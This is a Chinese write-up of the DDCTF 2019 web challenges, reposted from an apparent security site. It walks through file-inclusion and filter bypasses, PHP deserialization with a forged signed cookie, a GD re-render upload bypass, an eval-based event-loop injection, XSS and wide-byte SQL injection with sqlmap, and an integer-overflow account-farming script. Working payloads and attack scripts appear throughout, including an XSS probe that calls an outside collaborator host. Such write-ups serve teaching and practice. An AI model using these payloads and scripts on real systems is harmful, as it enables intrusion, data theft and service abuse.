> 原文链接: https://www.anquanke.com//post/id/178434 


# DDCTF2019官方Write Up——Web篇


                                阅读量   
                                **343931**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t019114f3b0c1f3e02e.jpg)](https://p0.ssl.qhimg.com/t019114f3b0c1f3e02e.jpg)



## 0x01：滴~

题目链接：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 首页是是一张图片

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019e868d2b77fd505f.png)

结合jpg参数怀疑存在文件包含漏洞，其加密方法是先ascii hex再经过两次base64

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c2785549a2db863f.png)

知道加密方法后可以读index.php文件

```
&lt;?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'&lt;/br&gt;';
$file = str_replace("config","!", $file);
echo $file.'&lt;/br&gt;';
$txt = base64_encode(file_get_contents($file));

echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;";
/*
 * Can you find the flag file?
 *
 */

?&gt;
```

网上搜代码可以发现这和之前[某春秋的题目](https://blog.csdn.net/qq_30435981/article/details/81268542)非常类似，diff一下出题点应该在https://blog.csdn.net/FengBanLiuYun/article/details/80616607 根据提示的日期Date: July 4,2018可以找到对应的博文

[![](https://p4.ssl.qhimg.com/t018773cde091d6ed31.png)](https://p4.ssl.qhimg.com/t018773cde091d6ed31.png)

这里卡了好久各种试已知路径的swp文件，最后发现访问http://117.51.150.26/practice.txt.swp有反应，提示了flag文件位置。

[![](https://p1.ssl.qhimg.com/t01095b9177179f5e27.png)](https://p1.ssl.qhimg.com/t01095b9177179f5e27.png)

因为index.php中把解码后的文件名用以下正则做了过滤，不允许有了除了.之外的特殊符号而flag文件中含有!所以无法直接阅读文件内容。

```
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
```

不过这段在进行正则过滤后又进行了二次过滤代码如下，恰巧又是用!，所以可以用文件名flagconfigddctf.php绕过

```
$file = str_replace("config","!", $file);
```

接着读flag!ddctf.php

```
&lt;?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
`{`
    $content=trim(file_get_contents($k));
    if($uid==$content)
    `{`
       echo $flag;
    `}`
    else
    `{`
       echo'hello';
    `}`
`}`

?&gt;
```

extract($_GET);这里有一个明显的变量覆盖漏洞，把k覆盖成vps地址，uid参数与vps地址内容保持相同即可，如图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a7269889c4dc4ec2.png)

## 0x02：WEB 签到题

题目链接：http://117.51.158.44/index.php

直接登陆会提示权限不够

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015c25d168ad1d0a7d.png)

抓包分析可以看到有个明显的header头didictf_username

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017a6e65bcd9896ac3.png)

把它改成admin即可正常访问

[![](https://p3.ssl.qhimg.com/t0112bbc3805ddf9d10.png)](https://p3.ssl.qhimg.com/t0112bbc3805ddf9d10.png)

访问可以拿到两个php文件源码

url:app/Application.php

```
Class Application `{`
    var $path = '';


    public function response($data, $errMsg = 'success') `{`
        $ret = ['errMsg' =&gt; $errMsg,
            'data' =&gt; $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    `}`

    public function auth() `{`
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) `{`
            $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        `}`else`{`
            $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        `}`

    `}`
    private function sanitizepath($path) `{`
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
`}`

public function __destruct() `{`
    if(empty($this-&gt;path)) `{`
        exit();
    `}`else`{`
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) `{`
            exit();
        `}`
        $this-&gt;response($data=file_get_contents($path),'Congratulations');
    `}`
    exit();
`}`
`}`
```

url:app/Session.php

```
include 'Application.php';
class Session extends Application `{`

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration          = 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path            = '';
    var $cookie_domain              = '';
    var $cookie_secure              = FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    `{`
    if(parent::auth()) `{`
            $this-&gt;get_key();
            if($this-&gt;session_read()) `{`
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            `}`else`{`
                $this-&gt;session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            `}`
        `}`

    `}`

    private function get_key() `{`
        //eancrykey  and flag under the folder
        $this-&gt;eancrykey =  file_get_contents('../config/key.txt');
    `}`

    public function session_read() `{`
        if(empty($_COOKIE)) `{`
        return FALSE;
        `}`

        $session = $_COOKIE[$this-&gt;cookie_name];
        if(!isset($session)) `{`
            parent::response("session not found",'error');
            return FALSE;
        `}`
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) `{`
            parent::response("the cookie data not match",'error');
            return FALSE;
        `}`
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))`{`
            return FALSE;
        `}`

        if(!empty($_POST["nickname"])) `{`
            $arr = array($_POST["nickname"],$this-&gt;eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k =&gt; $v) `{`
                $data = sprintf($data,$v);
            `}`
            parent::response($data,"Welcome");
        `}`

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) `{`
            parent::response('the ip addree not match'.'error');
            return FALSE;
        `}`
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) `{`
            parent::response('the user agent not match','error');
            return FALSE;
        `}`
        return TRUE;

    `}`

    private function session_create() `{`
        $sessionid = '';
        while(strlen($sessionid) &lt; 32) `{`
            $sessionid .= mt_rand(0,mt_getrandmax());
        `}`

        $userdata = array(
            'session_id' =&gt; md5(uniqid($sessionid,TRUE)),
            'ip_address' =&gt; $_SERVER['REMOTE_ADDR'],
            'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'],
            'user_data' =&gt; '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
        $expire = $this-&gt;cookie_expiration + time();
        setcookie(
            $this-&gt;cookie_name,
            $cookiedata,
            $expire,
            $this-&gt;cookie_path,
            $this-&gt;cookie_domain,
            $this-&gt;cookie_secure
            );

    `}`
`}`

$ddctf = new Session();
$ddctf-&gt;index();
```

主要的逻辑点在session_read和session_create上，session_create会对一个数组的类型的数据进行序列化并签名，session_read会根据签名验证序列化的数据是否被篡改，如果没有被篡改那么就进行反序列化。显然这是一道考察反序列化知识点的题目，可利用的魔术方法是Application.php中的__destruct，这个类对应的对象在析构的时候会去文件内容并返回。

唯一需要解决的问题是如何拿到eancrykey,代码中和key操作相关的是session_read这一段

```
if(!empty($_POST["nickname"])) `{`
            $arr = array($_POST["nickname"],$this-&gt;eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k =&gt; $v) `{`
                $data = sprintf($data,$v);
            `}`
            parent::response($data,"Welcome");
        `}`
```

这里把eancrykey也带入了循环，所以只要nickname中有%s即可读出，具体操作如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01941da1c49fa7f75a.png)

有了eancrykey就可以随便签名了，下面是最终payload

```
&lt;?php

include 'Application.php';
$eancrykey = "EzblrbNS";

$sessionid = '';
while(strlen($sessionid) &lt; 32) `{`
    $sessionid .= mt_rand(0,mt_getrandmax());
`}`

$poc = new Application();
$poc-&gt;path = "..././config/flag.txt";

$userdata = array(
    'session_id' =&gt; md5(uniqid($sessionid,TRUE)),
    'ip_address' =&gt; $_SERVER['REMOTE_ADDR'],
    'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'],
    'user_data' =&gt; '',
    'flag' =&gt; $poc,
);

$cookiedata = serialize($userdata);
$cookiedata = $cookiedata.md5($eancrykey.$cookiedata);
echo "-----------------------------------------------\n";
var_dump($cookiedata);
```

[![](https://p1.ssl.qhimg.com/t0172b531e7777df833.png)](https://p1.ssl.qhimg.com/t0172b531e7777df833.png)

## 0x03：Upload-IMG

题目链接：http://117.51.148.166/upload.php 上传图片再去访问图片可以发现文件头有php gd的字样，结合题意（处理后的图片中要有phpinfo字样）猜测考的是PHP GD库二次渲染绕过，网上已经有很多相关文章。 工具在https://wiki.ioin.in/soft/detail/1q可以下载 经验就是 1、图片找的稍微大一点 成功率更高 2、shell语句越短成功率越高 3、一张图片不行就换一张 不要死磕 4、可以把gd处理的图片再用工具跑一遍再传 5、看脸 搞了几个小时之后出flag了。。。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01630b8eb9300460ea.png)

## 0x04：homebrew event loop

题目链接：http://116.85.48.107:5002/d5af31f88147e857/

题目源码

```
Download this .py file
Go back to index.html
# -*- encoding: utf-8 -*- 
# written in python 2.7 
__author__ = 'garzon' 

from flask import Flask, session, request, Response 
import urllib 

app = Flask(__name__) 
app.secret_key = '*********************' # censored 
url_prefix = '/d5af31f88147e857' 

def FLAG(): 
    return 'FLAG_is_here_but_i_wont_show_you'  # censored 
     
def trigger_event(event): 
    session['log'].append(event) 
    if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] 
    if type(event) == type([]): 
        request.event_queue += event 
    else: 
        request.event_queue.append(event) 

def get_mid_str(haystack, prefix, postfix=None): 
    haystack = haystack[haystack.find(prefix)+len(prefix):] 
    if postfix is not None: 
        haystack = haystack[:haystack.find(postfix)] 
    return haystack 
     
class RollBackException: pass 

def execute_event_loop(): 
    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 
    resp = None 
    while len(request.event_queue) &gt; 0: 
        event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" 
        request.event_queue = request.event_queue[1:] 
        if not event.startswith(('action:', 'func:')): continue 
        for c in event: 
            if c not in valid_event_chars: break 
        else: 
            is_action = event[0] == 'a' 
            action = get_mid_str(event, ':', ';') 
            args = get_mid_str(event, action+';').split('#') 
            try: 
                event_handler = eval(action + ('_handler' if is_action else '_function')) 
                ret_val = event_handler(args) 
            except RollBackException: 
                if resp is None: resp = '' 
                resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' 
                resp += '&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
                session['num_items'] = request.prev_session['num_items'] 
                session['points'] = request.prev_session['points'] 
                break 
            except Exception, e: 
                if resp is None: resp = '' 
                #resp += str(e) # only for debugging 
                continue 
            if ret_val is not None: 
                if resp is None: resp = ret_val 
                else: resp += ret_val 
    if resp is None or resp == '': resp = ('404 NOT FOUND', 404) 
    session.modified = True 
    return resp 
     
app.route(url_prefix+'/') 
def entry_point(): 
    querystring = urllib.unquote(request.query_string) 
    request.event_queue = [] 
    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: 
        querystring = 'action:index;False#False' 
    if 'num_items' not in session: 
        session['num_items'] = 0 
        session['points'] = 3 
        session['log'] = [] 
    request.prev_session = dict(session) 
    trigger_event(querystring) 
    return execute_event_loop() 

# handlers/functions below -------------------------------------- 

def view_handler(args): 
    page = args[0] 
    html = '' 
    html += '[INFO] you have `{``}` diamonds, `{``}` points now.&lt;br /&gt;'.format(session['num_items'], session['points']) 
    if page == 'index': 
        html += '&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;' 
        html += '&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' 
        html += '&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;' 
    elif page == 'shop': 
        html += '&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' 
    elif page == 'reset': 
        del session['num_items'] 
        html += 'Session reset.&lt;br /&gt;' 
    html += '&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
    return html 

def index_handler(args): 
    bool_show_source = str(args[0]) 
    bool_download_source = str(args[1]) 
    if bool_show_source == 'True': 
     
        source = open('eventLoop.py', 'r') 
        html = '' 
        if bool_download_source != 'True': 
            html += '&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' 
            html += '&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
             
        for line in source: 
            if bool_download_source != 'True': 
                html += line.replace('&amp;','&amp;amp;').replace('\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\n', '&lt;br /&gt;') 
            else: 
                html += line 
        source.close() 
         
        if bool_download_source == 'True': 
            headers = `{``}` 
            headers['Content-Type'] = 'text/plain' 
            headers['Content-Disposition'] = 'attachment; filename=serve.py' 
            return Response(html, headers=headers) 
        else: 
            return html 
    else: 
        trigger_event('action:view;index') 
         
def buy_handler(args): 
    num_items = int(args[0]) 
    if num_items &lt;= 0: return 'invalid number(`{``}`) of diamonds to buy&lt;br /&gt;'.format(args[0]) 
    session['num_items'] += num_items  
    trigger_event(['func:consume_point;`{``}`'.format(num_items), 'action:view;index']) 
     
def consume_point_function(args): 
    point_to_consume = int(args[0]) 
    if session['points'] &lt; point_to_consume: raise RollBackException() 
    session['points'] -= point_to_consume 
     
def show_flag_function(args): 
    flag = args[0] 
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
    return 'You naughty boy! ;) &lt;br /&gt;' 
     
def get_flag_handler(args): 
    if session['num_items'] &gt;= 5: 
        trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries 
    trigger_event('action:view;index') 
     
if __name__ == '__main__': 
    app.run(debug=False, host='0.0.0.0')
```

通读一遍代码之后可以发现这个题的代码逻辑和常规的flask开发不太一样
- 路由和功能的绑定 通常flask代码是用@app.route(‘/path’)装饰一个方法的形式来做路由，但是这段代码按照第一个;和第一个#分割路由和传入功能的参数，并且在eval那点的字符串可控
- [![](https://p0.ssl.qhimg.com/t01973b0e4d5975ab55.png)](https://p0.ssl.qhimg.com/t01973b0e4d5975ab55.png)
- 路由的异步性 要进行的操作都会放在一个队列里面，先进队列的先执行。
- [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01df6fe32709179699.png)
<li>后续的购买操作同样是这样，买东西的时候并不会立刻check是否点数合乎要求，而是先把num_items加上在被check路由放进队列。 [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cf481d818dda8061.png)
</li>
代码注入意味着我可以劫持程序运行的流程，结合路由的特性我可以直接注入我想要几个的操作一及其参数一次性加入到路由队列中（buy_handler+get_flag），又因为路由的异步性check路由在我get_flag路由之后，这样就可以在check金钱是否合理之前拿到flag。程序会把flag放在session中而根据flask客户端session的特性即可读出flag
- [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01b8ea23e2a74145cc.png)
- [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015de8df67b63022a8.png)
- 最终payload如下
action:trigger_event#;action:buy;10#action:get_flag;#a:show_flag;1

[![](https://p1.ssl.qhimg.com/t01784c1e2b54ae4cb7.png)](https://p1.ssl.qhimg.com/t01784c1e2b54ae4cb7.png)

```
python decodeflask.py .eJxtzlFrwjAUBeC_MvLsQ9oiXQo-KDMFIYZtmUkzxmiMk8YkltXaLeJ_X_FBcPbtwjl895yA3W9B9n4CDwpkoOBLWHLUUv_yW3LtpVh8SSGt8s-Gxtjo3B6VqSstdilhU3PtO201Rk7l2NNuMgHn0R3pFtGGNT9keonv0v_Ax1WQftUWoTYqHgfNIyuS2bHkY0jDvBuQvKylWKd9YyfF9iLdQqHMUSJi2RR8nZKkgGT1GLRZtv2AhjzNOhFjKvsxbI7Za4QMg-hb5W9DsweeAd-6z-qwcQ3I4AjU-8of-jM5_wEps3QC.D5IA3A.NigoaBZy6wUzszTAv0mYX2jqdu4
`{`u'points': 3, u'num_items': 0, u'log': ['action:trigger_event#;action:buy;10#action:get_flag;', ['action:buy;10', 'action:get_flag;'], ['func:consume_point;10', 'action:view;index'], 'func:show_flag;3v41_3v3nt_l00p_aNd_fLASK_cOOkle', 'action:view;index']`}`
```



## 0x05：欢迎报名DDCTF

题目链接：http://117.51.147.2/Ze02pQYLf5gGNyMn/ 之前一直各种测sql注入没反应，后来祭出了万能poc，发现是xss

```
App"/&gt;&lt;img src="http://6lsz939vedevmdegkun2wnzb52bszh.burpcollaborator.net/"&gt;
'$`{`9*9`}`[!--+*)(&amp;
```

用在线xss平台可以打到后台网页源码，页面源码中泄漏了一个接口。

```
http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1
```

当时一直卡在这里，遍历了id没反应，用xss测试之前发现的几个页面也没有发现（知道本题结做完我都不知道login.php干嘛的）。后来等到提示说是注入，注意到泄露的这个接返回的content-type是gbk，猜测这里是宽子节注入，手测没测出来，试试sqlmap的神秘力量。

inject.txt

```
GET /Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df* HTTP/1.1
Host: 117.51.147.2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://117.51.147.2/Ze02pQYLf5gGNyMn/
Connection: close
Upgrade-Insecure-Requests: 1
```

sqlmap跑一波

```
python sqlmap.py -r inject.txt --level 3
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019577542362ecad8d.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019c70535ea8b8677e.png)

最后dump字段的时候sqlmap忽然开始盲注了，为了尽快做出来直接用sqlmap的payload手注了一下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d7c8bab395409419.png)





## 0x06：大吉大利,今晚吃鸡~

题目链接：http://117.51.147.155:5050/index.html#/login 经过测试订单的钱可以改只要大于1000就可以，最后购买的时候在处理32-64位之间的整数时，会取到低32位。凭票入场之后就是吃鸡战场，每一个入场的选手都会又一个id和ticket，输入别人的就可以让人数减一。手快不如工具快，老汉能把青年赛，放脚本批量注册小号批量杀就可以了。

```
import requests
import json
import time
import uuid
import hashlib

proxies = `{`'http':'127.0.0.1:8080'`}`

def create_md5():
    m=hashlib.md5()
    m.update(bytes(str(time.time())))
    return m.hexdigest()

def register_pay():

    session = requests.Session()
    paramsGet = `{`"name":create_md5(),"password":create_md5()`}`
    print(paramsGet)
    headers = `{`"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"`}`
    response = session.get("http://117.51.147.155:5050/ctf/api/register", params=paramsGet, headers=headers, proxies=proxies)

    time.sleep(0.5)

    print(session.cookies)
    #print("Status code:   %i" % response.status_code)

    #print("Response body: %s" % response.content)

    paramsGet = `{`"ticket_price":"4294967296"`}`
    headers = `{`"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"`}`
    response = session.get("http://117.51.147.155:5050/ctf/api/buy_ticket", params=paramsGet, headers=headers, proxies=proxies)

    time.sleep(0.5)
    #print("Status code:   %i" % response.status_code)
    #print("Response body: %s" % response.content)

    headers = `{`"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"`}`
    response = session.get("http://117.51.147.155:5050/ctf/api/search_bill_info", headers=headers, proxies=proxies)
    # print(response.text)
    bill_id = json.loads(response.text)['data'][0]["bill_id"]

    time.sleep(0.5)
    #print("Status code:   %i" % response.status_code)
    #print("Response body: %s" % response.content)

    paramsGet = `{`"bill_id":bill_id`}`
    headers = `{`"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"`}`
    response = session.get("http://117.51.147.155:5050/ctf/api/pay_ticket", params=paramsGet, headers=headers, proxies=proxies)
    #print("Status code:   %i" % response.status_code)
    #print("Response body: %s" % response.content)
    time.sleep(0.5)
    headers = `{`"Accept":"application/json","Cache-Control":"max-age=0","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"`}`
    response = session.get("http://117.51.147.155:5050/ctf/api/search_ticket", headers=headers, proxies=proxies)

    #print("Status code:   %i" % response.status_code)
    #print("Response body: %s" % response.content)
    #print(response.text)
    id = json.loads(response.text)['data'][0]['id']
    ticket = json.loads(response.text)['data'][0]['ticket']
    print(id, ticket)
    return id,ticket

def kill(id, ticket):
    time.sleep(0.5)
    session = requests.Session()

    paramsGet = `{`"ticket":ticket,"id":id`}`
    headers = `{`"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"`}`
    cookies = `{`"REVEL_SESSION":"3b2bacbee8fb18e1b1457171b422999d","user_name":"cl0und"`}`
    response = session.get("http://117.51.147.155:5050/ctf/api/remove_robot", params=paramsGet, headers=headers, cookies=cookies)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)


if __name__ == '__main__':
    while True:
        try:
            id, ticket = register_pay()
            kill(id, ticket)
            time.sleep(0.5)
        except Exception as e:
            print e
```

杀完之后就有flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f7649110284387ed.png)

### <a name="header-n58"></a>大吉大利,今晚吃鸡~ 非预期解法

赛后看了其他师傅的wp，发现有些师傅以为这道考的是golang的整形溢出+批量kill小号，其实看到出题人的源码之后才知道。出题人是用python(flask)模拟了一个golang整形溢出的web环境，并且吃鸡战场的本意是想考hash长度扩展攻击（心情复杂.jpg）。发现这点原因是通过读mysql那道题的.bash_history可以发现出题人把这两道题放在同一台服务器上的。

[![](https://p5.ssl.qhimg.com/t014b556bd3c6b05bc9.png)](https://p5.ssl.qhimg.com/t014b556bd3c6b05bc9.png)

实际读一下，可以发现web2对应的是mysql题

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01556063e5d267ccc2.png)

web1对应的是吃鸡题

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c23a530764ce9e92.png)

在/home/dc2-user/ctf_web_1/web_1/app/main/views.py可以把部分主干代码都读出来(工具问题，换个工具应该可以读全)，这里已经有可以看到flag了

```
# coding=utf-8

from flask import jsonify, request,redirect
from app import mongodb
from app.unitis.tools import get_md5, num64_to_32
from app.main.db_tools import get_balance, creat_env_db, search_bill, secrity_key, get_bill_id
import uuid
from urllib import unquote

mydb = mongodb.db

